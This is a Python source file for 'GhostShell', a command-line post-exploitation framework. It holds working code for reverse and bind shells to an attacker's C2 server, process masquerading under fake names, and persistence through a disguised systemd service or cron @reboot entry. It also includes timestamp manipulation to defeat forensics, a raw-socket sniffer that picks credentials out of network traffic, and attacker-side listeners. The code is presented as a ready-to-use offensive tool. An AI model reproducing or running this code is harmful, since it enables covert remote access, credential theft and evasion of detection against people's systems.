"""
GhostShell - Post-Exploitation & OS Manipulation Framework
Main CLI Controller that orchestrates Agent and Client modules.
"""

import typer
import sys
import socket
import threading
import os
import time
import subprocess
import setproctitle 
from typing import List, Optional
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.prompt import Prompt
import concurrent.futures
import platform
import struct
import hashlib
import re
from datetime import datetime

# Import agent and client modules
import agent
import client

app = typer.Typer(help="GhostShell - Post-Exploitation & OS Manipulation Framework")
console = Console()

# --- UTILITIES ---

def activate_ghost(name: str):
    """Renames the process in system memory."""
    # Cron/Background safety: Skip animations if no terminal
    if not sys.stdout.isatty():
        try:
            setproctitle.setproctitle(name)
        except:
            pass
        return

    with console.status(f"[bold green]Masquerading as '{name}'...[/bold green]", spinner="dots"):
        time.sleep(1)
        setproctitle.setproctitle(name)
    console.print(f"[green]✔[/green] Process ID {os.getpid()} is now hidden as [cyan]{name}[/cyan]")

def execute_command(cmd):
    """Executes system commands and returns output, handling directory persistence."""
    cmd = cmd.strip()
    
    # Optimization: Native handling for 'cd'
    if cmd.startswith("cd "):
        try:
            target_dir = cmd[3:].strip()
            os.chdir(target_dir)
            return f"Changed directory to {os.getcwd()}".encode()
        except FileNotFoundError:
            return b"Error: Directory not found"
        except Exception as e:
            return str(e).encode()

    try:
        # Added timeout to prevent hanging on interactive commands
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
    except subprocess.TimeoutExpired:
        output = b"Error: Command timed out (10s limit for non-interactive shells)"
    except subprocess.CalledProcessError as e:
        output = str(e.output).encode()
    except Exception as e:
        output = str(e).encode()
    return output

# --- MODULE 1: AGENT REVERSE SHELL ---

@app.command()
def reverse_shell(
    ip: str = typer.Argument(..., help="Attacker's C2 Server IP"),
    port: int = typer.Option(4444, help="Attacker's C2 Port"),
    name: str = typer.Option("chrome-extension-helper", help="Fake process name")
):
    """[VICTIM] Reverse Shell - C2 beaconing connection."""
    console.print(Panel(f"Starting Reverse Shell Agent", title="Victim Mode", style="bold red"))
    activate_ghost(name)
    agent.reverse_shell(ip, port)

@app.command()
def bind_shell(
    port: int = typer.Option(4444, help="Local port to listen on"),
    name: str = typer.Option("systemd-resolved", help="Fake process name")
):
    """[VICTIM] Bind Shell - Listen for incoming connections."""
    console.print(Panel(f"Starting Bind Shell Agent on port {port}", title="Victim Mode", style="bold red"))
    activate_ghost(name)
    agent.bind_shell(port)

# --- MODULE 2: AUDIT SYSTEM ---

@app.command()
def audit():
    """[PRIVILEGE ESCALATION] Kernel Audit - Check for vulnerabilities."""
    console.print(Panel("Auditing System Security...", title="System Audit", style="bold yellow"))
    agent.audit_system()

# --- MODULE 3: PERSISTENCE ---

@app.command()
def persist(
    method: str = typer.Option("systemd", help="Method: 'systemd' or 'cron'"),
    payload: str = typer.Option("bind_shell --port 4444", help="Command to run on startup"),
    name: str = typer.Option(None, help="Process name to masquerade as")
):
    """[PERSISTENCE] Automatic Startup via systemd or cron."""
    script_path = os.path.abspath(sys.argv[0])
    python_path = sys.executable
    
    if name:
        payload += f' --name "{name}"'

    full_cmd = f"{python_path} {script_path} {payload}"
    
    console.print(Panel(f"Method: {method}\nPayload: {payload}", title="Persistence Engine", style="bold green"))

    if method == "systemd":
        service_content = f"""[Unit]
Description=System Telemetry Service
After=network.target

[Service]
Type=simple
ExecStart={full_cmd}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/ghostshell.service"
        try:
            with open(service_path, "w") as f:
                f.write(service_content)
            
            os.system("systemctl daemon-reload")
            os.system("systemctl enable ghostshell.service")
            console.print(f"[green]✔[/green] Systemd service created at {service_path}")
            console.print("[dim]Service obfuscated as 'System Telemetry Service'[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    elif method == "cron":
        cron_entry = f"@reboot {full_cmd}\n"
        try:
            current_cron = execute_command("crontab -l").decode().strip()
            if "no crontab" in current_cron or "command not found" in current_cron:
                current_cron = ""
            
            lines = [line for line in current_cron.splitlines() if script_path not in line or "@reboot" not in line]
            lines.append(cron_entry.strip())
            
            final_cron = "\n".join(lines) + "\n"
            with open("/tmp/cron_temp", "w") as f:
                f.write(final_cron)

            os.system("crontab /tmp/cron_temp")
            os.remove("/tmp/cron_temp")
            console.print(f"[green]✔[/green] Updated crontab")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

# --- MODULE 4: DEFENDER EVASION ---

@app.command()
def ghost(name: str = typer.Option("kworker/u4:0", help="Fake process name")):
    """[DEFENSE EVASION] Process Masquerading - Hide from monitoring tools."""
    console.print(Panel.fit(f"GHOST PROTOCOL ACTIVATED\nIdentity: {name}", style="red"))
    activate_ghost(name)
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]Ghost mode deactivated.[/yellow]")

# --- MODULE 5: PORT SCANNER ---

def scan_port(target, port, open_ports):
    """Helper function to scan a single port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        s.close()
    except:
        pass

@app.command()
def scan(
    target: str = typer.Argument(..., help="Target IP or Domain"),
    ports: str = typer.Option("1-1000", help="Port range (e.g., 1-1000)"),
    threads: int = typer.Option(50, help="Number of concurrent threads")
):
    """[RECONNAISSANCE] Port Scanner - Find open ports."""
    console.print(Panel(f"Scanning {target} ports {ports}...", title="Network Scanner", style="bold blue"))
    
    try:
        start_port, end_port = map(int, ports.split('-'))
    except ValueError:
        console.print("[red]Invalid port range format. Use 'start-end' (e.g., 1-1000).[/red]")
        return

    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        console.print(f"[red]Could not resolve host: {target}[/red]")
        return
    
    open_ports = []
    start_time = time.time()
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        task = progress.add_task(f"[green]Scanning {target} ({target_ip})...", total=end_port - start_port)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_port, target_ip, port, open_ports): port for port in range(start_port, end_port + 1)}
            for future in concurrent.futures.as_completed(futures):
                pass
    
    end_time = time.time()
    duration = end_time - start_time
    
    if open_ports:
        table = Table(title=f"Scan Report for {target} ({target_ip})")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="magenta")
        table.add_column("Status", style="green")
        
        for port in sorted(open_ports):
            try:
                service = socket.getservbyport(port, "tcp")
            except:
                service = "unknown"
            table.add_row(str(port), service.upper(), "OPEN")
        
        console.print(table)
        console.print(f"\n[bold green]✔[/bold green] Finished in {duration:.2f} seconds.")
    else:
        console.print(f"[red]No open ports found[/red]")

# --- MODULE 6: TIMESTOMPING ---

@app.command()
def timestomp(
    target: str = typer.Argument(..., help="Path to the file to modify"),
    ref_file: str = typer.Option("/bin/bash", help="Reference file to copy timestamps FROM"),
    date: str = typer.Option(None, help="Manual date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM')")
):
    """[ANTI-FORENSICS] File Timestamp Manipulation."""
    console.print(Panel(f"Target: {target}", title="Timestomper", style="bold purple"))
    
    if hasattr(date, "default"):
        date = None

    if not os.path.exists(target):
        console.print(f"[red]Error: Target file '{target}' not found.[/red]")
        return

    try:
        if date:
            try:
                dt_obj = datetime.strptime(date, "%Y-%m-%d %H:%M")
            except ValueError:
                try:
                    dt_obj = datetime.strptime(date, "%Y-%m-%d")
                except ValueError:
                    console.print("[red]Error: Invalid format! Use 'YYYY-MM-DD' or 'YYYY-MM-DD HH:MM'[/red]")
                    return
            
            timestamp = dt_obj.timestamp()
            os.utime(target, (timestamp, timestamp))
            console.print(f"[yellow]Manual Mode:[/yellow] Setting timestamp to [bold]{date}[/bold]")
            
        else:
            if not os.path.exists(ref_file):
                console.print(f"[red]Error: Reference file '{ref_file}' not found.[/red]")
                return
            
            st = os.stat(ref_file)
            os.utime(target, (st.st_atime, st.st_mtime))
            console.print(f"[cyan]Clone Mode:[/cyan] Copied timestamps from {ref_file}")
        
        new_stat = os.stat(target)
        table = Table(title="Timestamp Update")
        table.add_column("Type", style="cyan")
        table.add_column("New Timestamp", style="green")
        
        table.add_row("Access Time", str(datetime.fromtimestamp(new_stat.st_atime)))
        table.add_row("Modify Time", str(datetime.fromtimestamp(new_stat.st_mtime)))
        
        console.print(table)
        console.print(f"\n[green]✔[/green] Operation successful!")
        
    except Exception as e:
        console.print(f"[red]Operation failed: {e}[/red]")

# --- MODULE 7: NETWORK SNIFFER ---

@app.command()
def sniff(
    interface: str = typer.Option("eth0", help="Network Interface to sniff on"),
    count: int = typer.Option(0, help="Number of packets to capture (0 = infinite)")
):
    """[NETWORK SPYING] Raw Socket Sniffer - Capture credentials."""
    console.print(Panel(f"Sniffing on {interface}...", title="Packet Sniffer", style="bold red"))
    
    if platform.system() != "Linux":
        console.print("[red]Error: Raw Sockets only work on Linux![/red]")
        return

    try:
        conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        conn.bind((interface, 0))
    except PermissionError:
        console.print("[red]Error: Root privileges required.[/red]")
        return
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return

    captured = 0
    last_payload_hash = ""

    try:
        while True:
            if count > 0 and captured >= count:
                break
                
            raw_data, addr = conn.recvfrom(65535)
            dest_mac, src_mac, eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])
            
            if socket.ntohs(eth_proto) == 8:
                ip_header = raw_data[14:34]
                iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                protocol = iph[6]
                
                if protocol == 6:
                    version_ihl = iph[0]
                    ihl = version_ihl & 0xF
                    iph_length = ihl * 4
                    
                    tcp_header = raw_data[14+iph_length : 14+iph_length+20]
                    tcph = struct.unpack('!HHLLBBHHH', tcp_header)
                    
                    src_port = tcph[0]
                    dest_port = tcph[1]
                    
                    doff_reserved = tcph[4]
                    tcph_length = (doff_reserved >> 4) * 4
                    
                    header_size = 14 + iph_length + tcph_length
                    payload = raw_data[header_size:]
                    
                    try:
                        decoded = payload.decode('utf-8', errors='ignore')
                        # 1. Clean ANSI Escape Codes (Colors)
                        clean_text = re.sub(r'\x1b\[[0-9;]*m', '', decoded)
                        
                        # 2. Define Ignore List (Noise)
                        ignore_terms = ["User-Agent:", "Mozilla/", "Docker-Client", "Containerd"]
                        
                        # 3. Define Specific Keywords
                        keywords = ["USER=", "PASS=", "PASSWORD=", "LOGIN", "Authorization", "USER ", "PASS ", "admin"]
                        
                        for line in clean_text.splitlines():
                            line = line.strip()
                            if not line: continue
                            
                            # Skip Noise
                            if any(ign in line for ign in ignore_terms):
                                continue

                            # Check for Credentials
                            if any(key in line for key in keywords) and len(line) < 200:
                                line_hash = hashlib.md5(line.encode()).hexdigest()
                                if line_hash == last_payload_hash:
                                    continue
                                
                                last_payload_hash = line_hash
                                console.print(f"\n[bold red]ALERT: Sensitive Data![/bold red]")
                                console.print(f"From: {socket.inet_ntoa(iph[8])}:{src_port} -> {socket.inet_ntoa(iph[9])}:{dest_port}")
                                console.print(Panel(line, style="yellow"))
                                captured += 1
                                break
                    except:
                        pass

    except KeyboardInterrupt:
        console.print("\n[yellow]Sniffer stopped.[/yellow]")

# --- MODULE 8: ATTACKER CLIENT ---

@app.command()
def listener(port: int = typer.Option(4444, help="Local port to listen on")):
    """[ATTACKER] Listen for Reverse Shell."""
    console.print(Panel(f"Listening on 0.0.0.0:{port}...", title="Attacker Mode", style="bold cyan"))
    client.listen_for_reverse_shell(port)

@app.command()
def handler(
    target: str = typer.Argument(..., help="Target IP"),
    port: int = typer.Argument(..., help="Target Port")
):
    """[ATTACKER] Connect to Bind Shell."""
    console.print(Panel(f"Connecting to {target}:{port}...", title="Attacker Mode", style="bold cyan"))
    client.connect_to_bind_shell(target, port)

# --- MODULE 9: INTERACTIVE MENU ---

@app.command()
def menu():
    """[INTERACTIVE] Dashboard Mode."""
    while True:
        console.clear()
        console.print(Panel.fit("[bold cyan]GhostShell[/bold cyan]", subtitle="Select a module"))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="dim", width=4)
        table.add_column("Module", style="bold")
        table.add_column("Description")
        
        options = [
            ("1", "Ghost", "Process Masquerading"),
            ("2", "Bind Shell", "Listen for connections (Victim)"),
            ("3", "Reverse Shell", "Connect to C2 (Victim)"),
            ("4", "Scanner", "Port Scanner"),
            ("5", "Audit", "Kernel Vulnerability Check"),
            ("6", "Timestomp", "File Timestamp Manipulation"),
            ("7", "Sniffer", "Credential Sniffer"),
            ("8", "Persistence", "Install Startup Hook"),
            ("9", "Listener", "Wait for reverse shell (Attacker)"),
            ("10", "Handler", "Connect to bind shell (Attacker)"),
            ("0", "Exit", "Close GhostShell")
        ]
        
        for opt in options:
            table.add_row(*opt)
            
        console.print(table)
        choice = Prompt.ask("Select", choices=[opt[0] for opt in options], default="0")
        
        if choice == "0":
            console.print("[yellow]Exiting...[/yellow]")
            break
            
        try:
            if choice == "1":
                name = Prompt.ask("Process Name", default="kworker/u4:0")
                ghost(name=name)
            elif choice == "2":
                port = int(Prompt.ask("Port", default="4444"))
                name = Prompt.ask("Process Name", default="systemd-resolved")
                bind_shell(port=port, name=name)
            elif choice == "3":
                ip = Prompt.ask("Attacker IP")
                port = int(Prompt.ask("Port", default="4444"))
                name = Prompt.ask("Process Name", default="chrome-extension-helper")
                reverse_shell(ip, port=port, name=name)
            elif choice == "4":
                target = Prompt.ask("Target IP")
                ports = Prompt.ask("Port Range", default="1-1000")
                threads = int(Prompt.ask("Threads", default="50"))
                scan(target=target, ports=ports, threads=threads)
                Prompt.ask("\nPress Enter...")
            elif choice == "5":
                audit()
                Prompt.ask("\nPress Enter...")
            elif choice == "6":
                target = Prompt.ask("Target File")
                ref_file = Prompt.ask("Reference File", default="/bin/bash")
                timestomp(target=target, ref_file=ref_file, date=None)
                Prompt.ask("\nPress Enter...")
            elif choice == "7":
                interface = Prompt.ask("Interface", default="eth0")
                sniff(interface=interface, count=0)
            elif choice == "8":
                method = Prompt.ask("Method", choices=["systemd", "cron"], default="systemd")
                payload = Prompt.ask("Payload", default="bind_shell --port 4444")
                persist(method=method, payload=payload)
                Prompt.ask("\nPress Enter...")
            elif choice == "9":
                port = int(Prompt.ask("Local Port", default="4444"))
                listener(port=port)
            elif choice == "10":
                target = Prompt.ask("Target IP", default="127.0.0.1")
                port = int(Prompt.ask("Port", default="4444"))
                handler(target=target, port=port)

        except KeyboardInterrupt:
            console.print("\n[yellow]Cancelled.[/yellow]")
            time.sleep(1)
        except Exception as e:
            console.print(f"\n[red]Error: {e}[/red]")
            Prompt.ask("\nPress Enter...")

@app.callback(invoke_without_command=True)
def main(ctx: typer.Context):
    if ctx.invoked_subcommand is None:
        menu()

if __name__ == "__main__":
    app()
